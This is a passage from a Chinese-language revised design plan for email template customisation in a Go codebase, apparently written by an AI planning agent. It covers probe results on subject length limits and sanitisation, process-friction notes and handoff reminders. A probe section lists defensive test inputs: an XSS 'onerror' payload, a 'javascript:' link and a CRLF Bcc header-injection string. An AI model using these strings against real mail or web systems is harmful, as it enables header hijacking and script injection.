- **位置**：`sanitizeSubjectField` / `sanitizeRenderedSubject` 的判据，单元级。
- **阈值**：无（布尔判据）。
- **构造**：`"A" + string(r) + "A"`，`r` 取 r2 表中九个码位。

```
== C9. T22 / INV12 — unicode.IsControl over r2's table ==
  U+0009 true   U+000D true   U+000A true   U+000B true   U+000C true
  U+0000 true   U+007F true   U+0085 true   U+009F true
  (九个全部 stripped="AA" 的等价形式：剥离后只剩两个 A)
```

**r2 的表没有错，九个都是真控制字符**——包括看起来像空白的 U+0085（NEL）与 U+009F（APC）。
错的是它不可读：读者无法从两个空反引号判断那里到底有没有字符。T22 因此改写为按码位列举。

### 探针 R5 — §8 既有具体数字重跑（**r3 全量复算**）

- **位置**：同 R1。
- **阈值**：998。
- **构造**：F1 = 内置邀请主题模板填入两个 60-rune CJK 字段；F2 = `中` 重复 cap 次。

```
== F1. today's built-in invitation subject, worst case (non-goal 10) ==
  inviter runes=60  ws runes=60
  subject runes=147 rawbytes=387 SubjectLine=1349  fits998=false

== F2. r2 probe C table, recomputed ==
  cap=200 -> 2185  false      cap=100 -> 1103  false
  cap=150 -> 1644  false      cap= 91 ->  996  true   ← r3 新增这一行
  cap=120 -> 1322  false      cap= 90 ->  987  true
                              cap= 80 ->  884  true
                              cap= 60 ->  665  true

== B6. full pipeline: 200-rune cap THEN 998-octet cap ==
  300 CJK   -> after200=200 (2185) -> after998= 91 runes  996
  300 ASCII -> after200=200 ( 209) -> after998=200 runes  209   ← octet 规则不触碰
  200 CJK   -> after200=200 (2185) -> after998= 91 runes  996
  300 emoji -> after200=200 (2928) -> after998= 67 runes  994
```

**1349 / 2185 / 209 三个数与 r2 一致，复算通过。** B6 是 T11/T23 断言的完整管线依据——
它同时说明两道上限的**顺序**（先 rune 后 octet）不影响结果，但顺序反过来会多做一次编码。

### 探针 R6 — §8 行为常量与字面量重跑（**r3 全量复算**）

- **位置**：逐条标注在下方（`html/template` 输出 / `net/mail` 解析后 / `Execute` 错误串）。
- **阈值**：无（字面量比对）。
- **构造**：见每条输出自身。

```
C1 T06  html/template 文本上下文  -> "<p>&lt;img src=x onerror=alert(1)&gt;</p>"
C2 T07  href 上下文 javascript:   -> "<a href=\"#ZgotmplZ\">go</a>"
        良性 URL                  -> "<a href=\"https://x.example/i?x=1&amp;y=2\">go</a>"
C3 T25  A&B 一次转义             -> "<p>A&amp;B</p>"   (含 A&amp;amp;B = false)
        预转义串再喂进去          -> "<p>A&amp;amp;B</p>"  ← 断言有鉴别力的证据
C4 T08  "Hi\r\nBcc: evil@..."    -> 清洗后 "HiBcc: evil@example.com"
   T08c "Hi\tThere"              -> 清洗后 "HiThere"
        QEncoding("Hi\tThere")   = "Hi\tThere"          ← TAB 原样穿过（INV2 的理由）
C5      清洗后过 net/mail         -> Subject=["HiBcc: evil@example.com"] Bcc=[] Cc=[] Reply-To=[]
C6 T13  语法错   零值/真数据 均 parse 失败
   T14  未知字段 零值/真数据 均 execute 失败：can't evaluate field SMTPPassword in type ...
   T14b {{slice .Code 0 3}}      零值报错(index out of range: 3) / 真数据 "123"   ← 假阳性
   T14c {{if .Code}}{{slice .Code 0 99}}{{end}}  零值通过 / 真数据报错             ← 假阴性
C7 T05  QEncoding + WordDecoder  三条中英混合主题往返 = true
C8      quoted-printable：raw 含 "a=b"，qp 中变成 "a=3Db"；90 个 x 在第 76 列软折
        qp 解回 == 原始串 : false ← **裸 \n 被规范化成 \r\n**，见 §14 实现陷阱
```

C6 的 T14b / T14c 两行是**同一个机制在两个方向上的反例**：零值预执行既会误报（合法模板被判错）
又会漏报（有问题的模板被放过）。**它们合起来是 §7.3「诊断而非决策」的全部依据**，缺一条这个
结论就只是个偏好。

---

## 13. 流程摩擦（新版交付流程首次实跑，如实记录）

延续 intake 5 条、r1 的 M6–M9、实现的 4 条，r2 卡片新增 M10–M13（保留在下方，未改），
**r3 本轮新增 M14–M17**。

**M10 — 「不重开路线选择」与「全文自洽性复查」之间有一段没人负责的灰带。**
卡片把范围严格限定为「PG1 裁决 + PG2 裁决 + 全文自洽复查」，同时要求「发现第三第四处冲突一并
修订」「发现但无法自行裁决的上报，不要自行扩大设计」。**PG3（998 octet 上限）恰好落在两条规则
的缝里**：它不是路线选择，但它给方案加了一条 r1 完全没有的新约束，并且**改变了发起人在闸门 1
对 Q3（200 rune）裁决的实际效果**——发起人批的是 200 字，实际生效的是 CJK **91 字**
（r2 此处写「约 80 字」，是 PG10 的错值，r3 已订正）。
我的处置是**两条都做**：在 r2 里按推荐值修订（否则实现拿到的还是一个会产出违规 header 的方案），
同时把它写成 Q5 交闸门 1 确认（否则等于我替发起人改了他的裁决）。
**建议**：正本补一条——「返工卡片的复查若产出会改变既有闸门裁决**实际效果**的修订，一律同时
落进方案并升格为闸门确认项」。只落方案会架空闸门，只提问会让实现拿到已知有问题的方案。

**M11 — 「零 diff 是 INV4 的机械证据」这条设计约束，在第二次复用时才暴露出它有传染性。**
r1 为了让 `buildInvitationParams` 零 diff，选择了「新增平行函数」。r2 做复查时发现
`sanitizeSubjectField` 面临**完全相同**的处境（PG6），只能做**完全相同**的选择，于是重复的
函数从一对变成两对。这不是某一次决策失误，而是「用零 diff 换机械证据」这个策略的**固有代价
会随接触面线性增长**——而 r1 只在单点评估了它的代价（§4.3 写「代价是两个函数并存」），
没有评估它作为一条通用策略的累积代价。L3 的 `must_answer` 4 已经把这个问题交出去了。
**建议**：方案里凡出现「为保零 diff 而新增平行实现」的决定，应当在同一处写明**还有哪些位置会
被同一条理由波及**，而不是等到下一轮复查逐个发现。

**M12 — 探针豁免（r1 的 M8）这一轮仍然只能靠自行判断，且这次的用量大得多。**
r1 建议正本明确写「规划可以为取证运行一次性探针」。本轮该建议尚未进入正本，而 r2 的取证需求
比 r1 更重——PG1 的裁决依据（TAB 豁免）、PG3 的全部数值、PG4 的构造性反例，**没有一条能靠
读代码得出**，必须真的跑 Go。我沿用 r1 的处置：探针在 `/workspaces/.../probe-r2/`（仓库外），
执行后删除，只把命令与输出入账（§12），仓库工作树 clean。
**补充一条 r1 没提的**：本轮有一个探针（`p2.go`）因为我先加了 `//go:build ignore` 又用
fallback 命令改写，导致文件在磁盘上被修改过一次。这类「探针本身被改」的过程不会进入账本，
但它意味着 §12 的输出与我最初写下的探针源码不是同一版本。**证据的可复现性依赖的是输出 + 命令，
不是探针源码的稳定性**——正本若要求探针入账，应当明确要求入账的是**最终版本的命令与输出**，
并允许探针源码在过程中变动。

**M13 — 卡片说「r2 开头单开一节写复查发现了什么，包括『未发现其他冲突』这个结论本身」，
但没说发现了 7 处该怎么组织。**
我按「一张对照表 + 每条给处置」写在 §0.3，并把每一处的修订下沉到对应章节。这样做的代价是
**§0 变成了一份必须与全文交叉阅读的导览**，单独读 §0 会以为方案只改了 7 个点，
实际上 §5、§7.1、§7.3、§8 都有结构性改写。
**建议**：返工卡片若预期复查产出较多，正本应当要求 r2 附一份**「r1 → r2 变更清单」**
（哪些小节整段重写、哪些不变），而不是只要求「开头写裁决」。我在 §14 补了一段权宜的替代。

**M14 — 调度请我评估他自己的审查判据，我的结论是：这一轮的两个 finding 靠「读」是找不到的，
所以那条教训（M-L5）成立，但它给出的对策不够。**
调度引 M-L5「让被检查方先跑一遍检查表会降低检查方的实际投入」，并明确邀请异议。我的判断：
**M-L5 描述的现象是真的，但本轮真正起作用的不是「检查方投入多少」，而是「检查方跑没跑」。**
PG10 与 PG11 都不是读得出来的——PG10 要重跑一次 998 阈值下的枚举才能发现 81 的阈值是 900，
PG11 要真的去构造那个 998 才能发现构造不出来。**任何形式的「读一遍 + 打勾」，无论投入多大，
都不会产出这两条。** 所以对策不该是「别让被检查方先跑检查表」，而应当是
**「检查方必须独立复算方案里的每一个具体数字，不看方案的记录」**——这一条比前一条更贵，
也更窄，但它是唯一能抓到 PG10 这类 finding 的方法。
**顺带一条自我批评**：我在 r2 里写了「探针输出必须标注管线位置」这条纪律，并自认为做到了。
它确实做到了，但它只覆盖了一半（位置），漏掉的另一半（阈值 + 构造）正是 PG10 的入口。
**一条只覆盖一半的纪律，比没有纪律更危险，因为它会让人以为已经严谨了。** r3 §12 补全为三项。

**M15 — 我不接受调度对 PG7 行号的订正，这需要一个机制来承载「被检查方不同意」。**
调度说 `email.go:227-238` 应为 `:229-238`。我读了字节，认为 `:227` 是必须包含的：R12 断言的是
「无条件打印一行」，而这个性质由 `switch {`（227）与 `}`（238）的**穷尽性**保证，`:229` 只是
分支内一个局部赋值，什么都不界定（§0.6）。**我按证据改，不按结论改。**
但目前的流程里，返工卡片是单向的：调度写 finding，我逐条处置。「我认为这条 finding 不成立」
只能写在方案里等下一轮被读到，**没有一个字段承载它**。本轮我把它写进 §0.6 并请调度在核对时
指出，但这依赖调度会读到那一段。
**建议**：正本给返工处置补一个显式取值 `REJECTED`（连同理由与证据），与 `ACCEPTED` 并列，
让「不采纳」成为一个必须被核对的结构化状态，而不是藏在正文里的一段话。

**M16 — 「不要重新生成全文，cp + 定点编辑 + 每改一处就 push」这条新方法，本轮实跑有效，
但它有一个不在方法描述里的副作用。**
上一个 Run 死于输出途中、零持久化。本轮改为 13 个增量步骤，每步一次 commit + push，
到目前为止没有任何一步的产出会因为下一步失败而丢失。**这条方法应当进正本**，判据是
「产物超过某个体量（本次 103,688 字节）且要求逐字节保留未改动部分」。
**但副作用是**：`cp` 得到的文件里，所有「本文是 r2」的自指内容都会静默地变成错的——
front matter 的 `ts` / `action`、preamble 的「本文取代…」、§13 的「本卡片新增 4 条」、
§14 的变更清单。这些地方**不会因为我漏改而报错**，只会变成一份自称是 r2 的 r3。
本轮我把它们列成清单逐个改（front matter、preamble、§0 导览、§13 引言、§14 清单）。
**建议**：正本在推荐 cp 方法时，必须同时给一份**自指内容检查表**，否则这条方法用得越熟练、
漏得越隐蔽——全文重写至少还会强迫作者重读一遍每一句自指。

**M17 — 复算发现的三条新 gap（PG12–PG14）都不在卡片范围内，我做了但这属于灰带。**
卡片说「范围严格限定：PG10、PG11、两处行号订正、§8 剩余具体数字全量复算」。PG12（R9 关于
`text/template` 的事实错误）、PG13（探针 D 第二行不可复现）、PG14（三处行号精度）**都是在做
第四项时顺带撞见的**，严格说不在前三项里，但它们又确实是「§8 及其依据面上的错误」。
我的处置是全部修订并单独列在 §0.7，让核对方能一眼看出哪些是卡片要求的、哪些是我自行扩大的。
**这与 M10 是同一个灰带在第二次出现**：M10 那次是「复查产出了改变闸门效果的修订」，
这次是「复算产出了范围外的事实订正」。两次我都选择了「做 + 标注」，但正本至今没有规则。
**建议**：正本明确一条——**「按范围执行时撞见的范围外事实错误，一律修订并单独成节标注，
不得静默修订、也不得因超范围而放着不管」**。静默修订会让核对方无法区分授权与越权；
放着不管则是明知有错还交出去。

---

## 14. 交接

- **状态**：FROZEN。方案冻结，等调度核对 → 闸门 1。
- **产物**：`multica-ledger/feature-email-template-customization/planner/20260826-134000-plan-r3.md`
- **取代**：`planner/20260826-121052-plan-r2.md`（sha256 `13daf92c…4116e70`，**从未冻结**，
  于 20260826-123504 被 RETURN，原样保留）；r1（`planner/20260826-110423-plan-r1.md`，
  sha256 `e70497a2…f20267f7`）同样原样保留。账本 append-only，两份都不删不改。
- **BASE**：`f74a71060fcdd45318cae6fb7caf7c0d7e71cdfa`，tree `57e81be90cc49effdc55aa2f06f16aef35689aba`
- **分支**：`feature/email-template-customization`
- **本分录的 tree**：见 front matter（= 写本分录前 HEAD 的 tree；工作树在写本分录前 clean，
  探针在仓库外 `probe-r3/` 运行并已删除）
- **下一步**：调度核对 → 父 Issue 闸门 1（@ 发起人），交 **Q5a / Q5b** 与 §9 的可证伪条件；
  放行后提升 HD-53。

### r2 → r3 变更清单（**本轮**，M13/M16 的处置）

**范围严格限定为卡片给的四项**：PG10 裁决、PG11 裁决、两处行号订正、§8 具体数字全量复算。
**路线选择（§6）、闸门 1 的 Q1–Q4 裁决、PG1–PG9 的处置一律未重开**，相应章节由 `cp` 保证
逐字节不变。下表列出**全部**被改动的位置——没列出的小节就是没动过：

| 小节 | 变更 | 触发 |
|---|---|---|
| front matter | `ts` / `action` / `tree` 更新，`verdict` 仍为 FROZEN | 自指（M16） |
| preamble | 「本文取代 r2」+ 产物形态说明（cp + 定点编辑 + 增量提交） | 自指（M16） |
| §0 导览 | 拆成「§0.1–0.3 = r2 裁决，仍生效」与「§0.4–0.7 = r3 新增」两段 | 自指 |
| §0.3 尾 | 补一段：r2 的探针纪律只覆盖了「位置」，漏了「阈值 + 构造」 | PG10 根因 |
| **§0.4** | **全新**——PG10 裁决：91 不是 81，附独立复算、阈值扫描、错值溯源、分字符集表 | PG10 |
| **§0.5** | **全新**——PG11 裁决：采纳 (b)，T24 拆为 T24a（不动点性质）+ T24b（运行期推导边界） | PG11 |
| **§0.6** | **全新**——两处行号：`auth.go:341→340` **采纳**；`email.go:227-238→229-238` **不采纳**，附字节级依据 | 行号订正 |
| **§0.7** | **全新**——复算撞见的 PG12（R9 事实错误）/ PG13（探针 D 不可复现）/ PG14（三处行号精度） | 复算副产物（M17） |
| §1.2 | R1 补 `generateCode` 位置；**R9 改写**（`help.go:6` 确有 `text/template`）；R12 补 `:227-238` 理由；R14 行号订正 | PG12/PG14 |
| **§2** | **Q5 拆为 Q5a（要不要这条上限）/ Q5b（取值与超限行为）**，两问都给推荐；错值全部订正 | PG10 + 卡片授权 |
| §3.5 / §3.6 | `auth.go:340`；`testSMTPServer:502-514`、`handleConn:544-638`、EHLO `:570-577` | 行号订正/PG14 |
| §4.2 | P03 `:340-360`；**P29 写集从 `:502-624` 扩到 `:502-638`** | 行号订正/PG14 |
| §5 | INV11 / INV12 行改写；**新增 §5.1**：INV11 的度量 + 阈值 + 单调性前提三项写死 | PG10 |
| §8 | T21 改为分字符集表述；T22 改为按码位列举；T23 改为精确 91/996 + 台阶 1018；**T24 → T24a/T24b**；**新增 §8.1 数字出处表** | PG10/PG11/复算 |
| §11 | L3 `must_answer` 6 订正为 91，并追加一问：Q5 拆分是给了否决空间还是包装 | PG10 |
| §12 | 头部补「位置 + 阈值 + 构造」记录纪律；**删除探针 D 前两行**（错值来源 + 不可复现行）；**新增探针 R1–R6** | PG10/PG13 |
| §13 | **新增 M14–M17**（含对调度审查判据的异议、对 PG7 订正的不采纳、cp 方法的自指副作用、范围灰带）；M10 数字订正 | 卡片邀请异议 |
| §14 | 本节：交接信息、r2→r3 清单、实现提醒补第 7 条、UNVERIFIED 清单 | 自指 |

### r1 → r2 变更清单（r2 轮记录，原样保留）

| 小节 | 变更 |
|---|---|
| §0 | **全新**——两处裁决 + 全文自洽复查结果 |
| §1.2 | 新增 R12–R15（无条件通道日志、时变 header、mock relay 无 8BITMIME、DATA 丢弃式读取） |
| §1.3 | 新增 D6（wire 层 vs 内容层的混淆是 PG4/PG5/PG9 的共同根因） |
| §1.4 | A4 补 octet 上限；新增 A7 |
| §1.5 | 新增 non-goal 9（不做 parse tree 静态校验）、10（不修既有超长主题问题） |
| §2 | Q1–Q4 记录为已裁决；**新增 Q5**（998 octet 上限确认） |
| §3.3 | **重写**——TAB 豁免、不折行、QP 分支、时变 header 全部补入 |
| §3.6 | **全新**——既有 harness 观测能力实测 |
| §4.2 | 新增 P08b / P27 / P28 / P29；P09 处置改写 |
| §4.3 | **扩写**——新增 `sanitizeSubjectField` 的同类决定与 T22 对冲 |
| §4.4 | U3 依据更新为本轮复算；新增 U7 / U8 |
| §5 | INV2 / INV4 / INV5 / INV8 **改写**；**新增 INV11 / INV12** |
| §6 | 不变（路线选择未重开），仅补一条方案 A 的新代价 |
| §7.1 | 规则 1 理由**改写**（PG2）；主题防线段落**重写**（PG1/PG3） |
| §7.3 | **重写为三时机表**（PG2），并指定日志输出流 |
| §8 | 新增三条全局观测规则；T01/T08/T11/T14/T16 改写；新增 T05b/T08b/T08c/T14b/T14c/T22/T23/T24/T25 |
| §9 | 新增可证伪条件 10 / 11 / 12 |
| §10 | write_set 补 P08b/P27/P28/P29；冲突预案补两条 harness 要求 |
| §11 | L1 新增 must_answer 2/3；L2 新增 2/4（三个日志点）；L3 新增 6/7 |
| §12 | **全部重测**，新增探针 A/B/C/D/P5/P5b/P7/P8/U/S |
| §13 | 新增 M10–M13 |

### 给实现的提醒（最容易做错的**七**处）

1. **别给 `buildInvitationParams` 加参数**（§4.3）。加了就毁掉 INV4 的机械证据。
2. **别改 `sanitizeSubjectField`**（§4.3/PG6）。新路径用新函数 `sanitizeRenderedSubject`，
   两者用同一个 `unicode.IsControl` 判据，靠 T22 锁住不漂移。
3. **别把已 `html.EscapeString` 的字符串喂给模板**（§7.1、T25）。二次转义在生产邮件里
   表现为用户名变乱码，而单元测试若只测 ASCII 名字很可能测不出来。
4. **别把 SMTP writer 交给 `Execute`**（INV10）。先 `bytes.Buffer`，成功才用。
5. **别在任何一条告警里记数据结构或渲染结果**（INV1、L2）。r2 把日志点从 1 个增加到 3 个，
   三条都受这个约束，包括那条零值预执行的诊断。
6. **别拿原始 DATA 做正文断言**（PG4/R-OBS-1）。必须先反 dot-stuffing 再解 QP。
   `&lt;img …&gt;` 在原始 DATA 里是找不到的——§12 探针 P7 已经给出反例。
7. **（r3 新增）反 dot-stuffing 之后，信头与正文的分隔符是 `"\n\n"` 而不是 `"\r\n\r\n"`。**
   `textproto` 的 DotWriter 与 DotReader 是精确互逆的，但 **DotReader 在还原时把 CRLF 改写回
   裸 LF**。本轮我按 `"\r\n\r\n"` 去切分抓到的 DATA，`strings.Index` 返回 `-1`，切片越界 panic。
   这不是一个 finding（我方代码没错），但它会让 T01 的「逐字节相同」与 T05b 的「8bit 与 QP
   解回后相同」两条断言在实现时第一次跑就红，而红的原因与被测行为完全无关。
   正确的观测链（R-OBS-1）是：`DotReader` 读完整 DATA → 按 `"\n\n"` 切 header / body →
   header 用 `net/mail` 解析、body 按 `Content-Transfer-Encoding` 解 QP →
   断言 `8bit 解回 == qp 解回` 且 `== 原始 Go 字符串（裸 \n）`，本轮两条都实测为 true。

### 现在观测不到目标行为的地方（harness 必须先补，这是 RED 准备不是被测改动）

- BASE 的 `testSMTPServer` **没有**抓取 SMTP `MAIL FROM` 与 `DATA` 的能力（R15）。
  T01–T10 全部依赖它。命名建议见 §10 冲突预案。
- **DATA 读取必须用 `textproto` 的 DotReader**，不能沿用 BASE 那个 `readLine()` 循环——
  否则正文里以 `.` 开头的行会被读成 `..`，T10 会假绿（PG4）。
- **需要新增 `Advertise8BITMIME` 开关**（R14）。BASE 的 relay 恒不广播，`has8Bit` 恒 false，
  8bit 分支从未被任何测试跑到过。T05b 是它的第一个用例。
- Resend 通道**完全没有**测试覆盖（`s.client.Emails.Send` 无桩）。T08b/T17 需要新引入一个
  接口缝或直接断言 `SendEmailRequest` 的构造结果——推荐后者，改动更小。

### `UNVERIFIED` 清单

U1 上游维护者取向（**本次交付内不可验，随交付交出**）· U2 F3 偏好原文措辞 ·
U3 #7577 合入时点（本轮复算仍未合入）· U4 自建用户真实挂载方式 ·
U5 `html/template` 并发 `Execute` 安全性 · U6 文档翻译一致性 CI 检查是否存在 ·
**U7 真实 MTA 对超长 `Subject:` 行的处置** · **U8 零值预执行诊断的真实假阳性率**

**r3 补注**：U7 的分量在本轮**上升了**。Q5a 之所以成为一个真问题，正是因为 U7 未验证——
INV11 的全部收益都押在「真实 MTA 会对超长 `Subject:` 行做点什么」上，而我只读了 RFC，
没有对任何真实 relay 做过实验。**这条盲区同时适用于既有内置路径**（今天就在产出 1349 octet
且无人报障，non-goal 10）。若闸门 1 认为该验，它属于 QA 而非规划的能力面。

### 需要决策

- **Q5a**（要不要这条 998 octet 上限）与 **Q5b**（若要，取值与超限行为），§2，
  随闸门 1 提交，**两问都已给推荐**，发起人可以只回「都按推荐」结束整项。**不阻塞** stage 2。
- PG1、PG2、**PG10、PG11** 已由本文裁决（§0.1/§0.2/§0.4/§0.5），不再是待决项。
- 两处行号订正：一处采纳、一处**不采纳**（§0.6）。不采纳的那处需要调度在核对时确认或推翻——
  这是本轮唯一一个「我不同意上游 finding」的点，见 M15。
